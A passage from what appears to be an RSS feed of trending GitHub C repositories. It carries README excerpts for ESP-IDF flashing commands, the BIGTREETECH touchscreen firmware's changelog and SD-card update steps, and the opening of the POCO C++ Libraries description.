&lt;li&gt;&lt;code&gt;idf.py app&lt;/code&gt; - build just the app.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;idf.py app-flash&lt;/code&gt; - flash just the app.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;idf.py app-flash&lt;/code&gt; will automatically rebuild the app if any source files have changed.&lt;/p&gt;
&lt;p&gt;(In normal development there's no downside to reflashing the bootloader and partition table each time, if they haven't changed.)&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-erasing-flash" class="anchor" aria-hidden="true" href="#erasing-flash"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Erasing Flash&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;idf.py flash&lt;/code&gt; target does not erase the entire flash contents. However it is sometimes useful to set the device back to a totally erased state, particularly when making partition table changes or OTA app updates. To erase the entire flash, run &lt;code&gt;idf.py erase_flash&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This can be combined with other targets, ie &lt;code&gt;idf.py -p PORT erase_flash flash&lt;/code&gt; will erase everything and then re-flash the new app, bootloader and partition table.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-resources" class="anchor" aria-hidden="true" href="#resources"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Documentation for the latest version: &lt;a href="https://docs.espressif.com/projects/esp-idf/" rel="nofollow"&gt;https://docs.espressif.com/projects/esp-idf/&lt;/a&gt;. This documentation is built from the &lt;a href="docs"&gt;docs directory&lt;/a&gt; of this repository.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;a href="https://esp32.com/" rel="nofollow"&gt;esp32.com forum&lt;/a&gt; is a place to ask questions and find community resources.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/espressif/esp-idf/issues"&gt;Check the Issues section on github&lt;/a&gt; if you find a bug or have a feature request. Please check existing Issues before opening a new one.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you're interested in contributing to ESP-IDF, please check the &lt;a href="https://docs.espressif.com/projects/esp-idf/en/latest/contribute/index.html" rel="nofollow"&gt;Contributions Guide&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>espressif</author><guid isPermaLink="false">https://github.com/espressif/esp-idf</guid><pubDate>Tue, 04 Feb 2020 00:09:00 GMT</pubDate></item><item><title>bigtreetech/BIGTREETECH-TouchScreenFirmware #10 in C, This week</title><link>https://github.com/bigtreetech/BIGTREETECH-TouchScreenFirmware</link><description>&lt;p&gt;&lt;i&gt;support TFT35 V1.0/V1.1/V1.2/V2.0/V3.0, TFT28, TFT24 V1.1&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-software-version" class="anchor" aria-hidden="true" href="#software-version"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;software version&lt;/h1&gt;
&lt;h3&gt;&lt;a id="user-content-vxx25" class="anchor" aria-hidden="true" href="#vxx25"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Vx.x.25&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;change character encoding from GBK to UTF-8, compatible with new languages&lt;/li&gt;
&lt;li&gt;add "Preheat" menu for one button preheating(PLA, PETG, ABS)&lt;/li&gt;
&lt;li&gt;add command for Bltouch in "ABL"(automatic leveling) menu&lt;/li&gt;
&lt;li&gt;add More "menu" in printing (set RGB color, extrude for change filament, etc...)&lt;/li&gt;
&lt;li&gt;Rearranged the "Settings" menu
&lt;ul&gt;
&lt;li&gt;add silent mode(disable the buzzer)&lt;/li&gt;
&lt;li&gt;add automatic shutdown after printing feature(default disable, enable in menu "Settings-&amp;gt;Feature-&amp;gt;AutoPower" or "Printing-&amp;gt;Feature-&amp;gt;AutoPower")&lt;/li&gt;
&lt;li&gt;add smart filament detect feature (enable in menu "Settings-&amp;gt;Feature-&amp;gt;Smart ON", NEED Marlin to add "M114 E" command support, which will be merged into Mallin as soon as possible)&lt;/li&gt;
&lt;li&gt;New languages, currently supporting 11 languages: English, simplified Chinese, Russian, Japanese, Armenian, German, Czech, Spanish, French, Portuguese, Italian&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Added a Custom gcode menu&lt;/li&gt;
&lt;li&gt;Added unified menu
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/bigtreetech/BIGTREETECH-TouchScreenFirmware/tree/master/Copy%20to%20SD%20Card%20root%20directory%20to%20update%20-%20Unified%20Menu%20Material%20theme"&gt;unified menu&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/38851044/69716869-efb12100-1145-11ea-9b4e-e50a215e2def.png"&gt;&lt;img src="https://user-images.githubusercontent.com/38851044/69716869-efb12100-1145-11ea-9b4e-e50a215e2def.png" width="500" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bigtreetech/BIGTREETECH-TouchScreenFirmware/tree/master/Copy%20to%20SD%20Card%20root%20directory%20to%20update"&gt;classic menu&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/38851044/69717274-b7f6a900-1146-11ea-94c4-4033f23215bb.png"&gt;&lt;img src="https://user-images.githubusercontent.com/38851044/69717274-b7f6a900-1146-11ea-94c4-4033f23215bb.png" width="500" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Unified menu add status menu (hotend &amp;amp; bed temperature, fan speed, move speed, flow, XYZ position)&lt;/li&gt;
&lt;li&gt;Gcode file under classic menu is in icon mode, and model preview feature is added(Use with this &lt;a href="https://github.com/bigtreetech/BiQU_Tool"&gt;tool&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Gcode file under unified menu is in list mode, unable to preview the model, but more friendly for long filename&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fixed the bug that tft35 V3.0 could not connect to printer when switching from LCD12864 mode to touch screen mode&lt;/li&gt;
&lt;li&gt;Fixed the bug of printing from SD card on board&lt;/li&gt;
&lt;li&gt;Fixed print random stop when enable "keep alive" feature in Marlin&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-vxx24" class="anchor" aria-hidden="true" href="#vxx24"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Vx.x.24&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;add some settings (Before that, update your icons folder)&lt;/li&gt;
&lt;li&gt;Long Press Touch Screen or Rotary Encoder entry mode selection(Marlin's mode is SPI mode, touch mode is UART mode)&lt;/li&gt;
&lt;li&gt;setting -&amp;gt; more set -&amp;gt; Change 12864 background color&lt;/li&gt;
&lt;li&gt;setting -&amp;gt; more set -&amp;gt; Change 12864 font color&lt;/li&gt;
&lt;li&gt;setting -&amp;gt; more set -&amp;gt; GCODE&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-vxx23" class="anchor" aria-hidden="true" href="#vxx23"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Vx.x.23&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;add support TFT35 V3.0 (STM32F207)&lt;/li&gt;
&lt;li&gt;add filament runout on/off button&lt;/li&gt;
&lt;li&gt;replace Power off button with Rotate UI button&lt;/li&gt;
&lt;li&gt;improve the compatibility of smoothieware&lt;/li&gt;
&lt;li&gt;add manually leveling menu&lt;/li&gt;
&lt;li&gt;add multi-serial port function (Touch screen can be directly controlled by ESP3D)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-vxx22" class="anchor" aria-hidden="true" href="#vxx22"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Vx.x.22&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;clean up framework&lt;/li&gt;
&lt;li&gt;add support TFT35 V2.0 (SDIO)&lt;/li&gt;
&lt;li&gt;add function filament runout detect, power supply control&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-vxx21" class="anchor" aria-hidden="true" href="#vxx21"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Vx.x.21&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fix unable to print properly from U disk(Stop printing at random)&lt;/li&gt;
&lt;li&gt;fix busy popup with "Processing" in Printing and Stop Printing&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-vxx20" class="anchor" aria-hidden="true" href="#vxx20"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Vx.x.20&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The first version of the Integration Project&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a id="user-content-how-to-install-vscode-and-platformio-for-compile" class="anchor" aria-hidden="true" href="#how-to-install-vscode-and-platformio-for-compile"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to install vscode and platformio for compile&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Install the compilation environment, We recommend vscode + platformio. If you have already installed it, please skip this step.  If not, please see &lt;a href="https://github.com/bigtreetech/Document/blob/master/How%20to%20install%20VScode+Platformio.md"&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a id="user-content-how-to-compile-firmware" class="anchor" aria-hidden="true" href="#how-to-compile-firmware"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;how to compile firmware&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Please see the picture(①), which is the PlatformIO plugin, and then click ② Open Project to open the project.
&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/25599056/56637513-6b258e00-669e-11e9-9fad-d0571e57499e.png"&gt;&lt;img src="https://user-images.githubusercontent.com/25599056/56637513-6b258e00-669e-11e9-9fad-d0571e57499e.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find the BIGTREETECH TFT35 firmware source directory , then click Open
&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/25599056/56637532-77115000-669e-11e9-809b-f6bc25412f75.png"&gt;&lt;img src="https://user-images.githubusercontent.com/25599056/56637532-77115000-669e-11e9-809b-f6bc25412f75.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After opening the project, go to the platformio.ini file and change the default environment .
the “env_default” can be “BIGTREE_TFT35_V1_2”, “BIGTREE_TFT35_V1_1”, and “BIGTREE_TFT35_V1_0”
it depends on your hardware.
&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/25599056/56637542-7d073100-669e-11e9-9e9e-1efa6b73be5d.png"&gt;&lt;img src="https://user-images.githubusercontent.com/25599056/56637542-7d073100-669e-11e9-9e9e-1efa6b73be5d.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After the modification is complete, press Ctrl+Alt+B, and platformio will automatically download the compiled component and compile it.
&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/25599056/56637550-809ab800-669e-11e9-99d3-6b502e294688.png"&gt;&lt;img src="https://user-images.githubusercontent.com/25599056/56637550-809ab800-669e-11e9-99d3-6b502e294688.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;After the compilation is successful, a BIQU_TFT35_V1.x.x.bin file will be generated in the .pioenvs\BIGTREE_TFT35_V1_x directory. We need copy this file to the SD card, and insert this SD Card to TFT35 Touch Screen, then reset the Touch Screen,  the firmware will be updated automatically.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a id="user-content-how-to-config-firmware" class="anchor" aria-hidden="true" href="#how-to-config-firmware"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;how to config firmware&lt;/h1&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/25599056/61276962-b229a800-a7e3-11e9-83fe-ec5e944f1463.png"&gt;&lt;img src="https://user-images.githubusercontent.com/25599056/61276962-b229a800-a7e3-11e9-83fe-ec5e944f1463.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;
Modify the value of&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;#define TOOL_NUM     1    //set in 1~6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;#define EXTRUDER_NUM 1    //set in 1~6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;#define FAN_NUM      1    //set in 1~6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;to config hotend, extruder, fan number&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-how-to-update-firmware" class="anchor" aria-hidden="true" href="#how-to-update-firmware"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;how to update firmware&lt;/h1&gt;
&lt;p&gt;copy firmware(.bin), fonts(TFT24/font) and icons(TFT24/bmp) to SD Card root directory, insert SD card to touch screen, reset touch screen and then it will be updated automatically.&lt;/p&gt;
&lt;p&gt;unified menu in &lt;a href="https://github.com/bigtreetech/BIGTREETECH-TouchScreenFirmware/tree/master/Copy%20to%20SD%20Card%20root%20directory%20to%20update%20-%20Unified%20Menu%20Material%20theme"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/38851044/69716869-efb12100-1145-11ea-9b4e-e50a215e2def.png"&gt;&lt;img src="https://user-images.githubusercontent.com/38851044/69716869-efb12100-1145-11ea-9b4e-e50a215e2def.png" width="500" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;classic menu in &lt;a href="https://github.com/bigtreetech/BIGTREETECH-TouchScreenFirmware/tree/master/Copy%20to%20SD%20Card%20root%20directory%20to%20update"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/38851044/69717274-b7f6a900-1146-11ea-94c4-4033f23215bb.png"&gt;&lt;img src="https://user-images.githubusercontent.com/38851044/69717274-b7f6a900-1146-11ea-94c4-4033f23215bb.png" width="500" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The structure of the files in SD Card should be as follows
&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/25599056/61274462-75a77d80-a7de-11e9-8e86-04d3d2abfb4d.png"&gt;&lt;img src="https://user-images.githubusercontent.com/25599056/61274462-75a77d80-a7de-11e9-8e86-04d3d2abfb4d.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the &lt;strong&gt;.bin&lt;/strong&gt; file is the firmware of BIGTREETECH TFT24, this file needs to be updated every time for update function&lt;/li&gt;
&lt;li&gt;the &lt;strong&gt;TFT24&lt;/strong&gt; folder contains the icons and fonts, if you want to customize them, see &lt;a href="https://github.com/bigtreetech/BIGTREETECH-TouchScreenFirmware/tree/master/readme/English"&gt;here&lt;/a&gt; and update the folder by SD Card
&lt;ul&gt;
&lt;li&gt;icons: BMP format, 24/32 bit depth  (don't need update every time)&lt;/li&gt;
&lt;li&gt;fonts: this is a bitmap fonts of ASCII and unicode. (don't need update every time)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>bigtreetech</author><guid isPermaLink="false">https://github.com/bigtreetech/BIGTREETECH-TouchScreenFirmware</guid><pubDate>Tue, 04 Feb 2020 00:10:00 GMT</pubDate></item><item><title>pocoproject/poco #11 in C, This week</title><link>https://github.com/pocoproject/poco</link><description>&lt;p&gt;&lt;i&gt;The POCO C++ Libraries are powerful cross-platform C++ libraries for building network- and internet-based applications that run on desktop, server, mobile, IoT, and embedded systems.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="doc/images/logo.png"&gt;&lt;img src="doc/images/logo.png" alt="alt text" title="Poco Logo" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/pocoproject/poco" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/0c9666224117d2b66f34bd6b5d468785e53eacbf/68747470733a2f2f7472617669732d63692e6f72672f706f636f70726f6a6563742f706f636f2e706e673f6272616e63683d6d6173746572" alt="Travis Build Status" data-canonical-src="https://travis-ci.org/pocoproject/poco.png?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://ci.appveyor.com/project/obiltschnig/poco/branch/master" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b4197b4e91ec8ab693e32981e5c17bc18e5dda1b/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f376979727833663233337333616b61652f6272616e63682f6d61737465723f7376673d74727565" alt="Build status" data-canonical-src="https://ci.appveyor.com/api/projects/status/7iyrx3f233s3akae/branch/master?svg=true" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://bestpractices.coreinfrastructure.org/projects/370" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/4e0b883479edd51be1e6c6de9d845b9e191e8cd9/68747470733a2f2f626573747072616374696365732e636f7265696e6672617374727563747572652e6f72672f70726f6a656374732f3337302f6261646765" alt="CII Best Practices" data-canonical-src="https://bestpractices.coreinfrastructure.org/projects/370/badge" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-poco-portable-components-c-libraries-are" class="anchor" aria-hidden="true" href="#poco-portable-components-c-libraries-are"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;POCO (Portable Components) C++ Libraries are:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A collection of C++ class libraries, conceptually similar to the Java Class Library or the .NET Framework.&lt;/li&gt;
&lt;li&gt;Focused on solutions to frequently-encountered practical problems.&lt;/li&gt;
&lt;li&gt;Focused on "internet-age" network-centric applications.&lt;/li&gt;
&lt;li&gt;Written in efficient, modern, 100% ANSI/ISO Standard C++.&lt;/li&gt;
&lt;li&gt;Based on and complementing the C++ Standard Library/STL.&lt;/li&gt;
&lt;li&gt;Highly portable and available on many different platforms, from embedded to server.&lt;/li&gt;
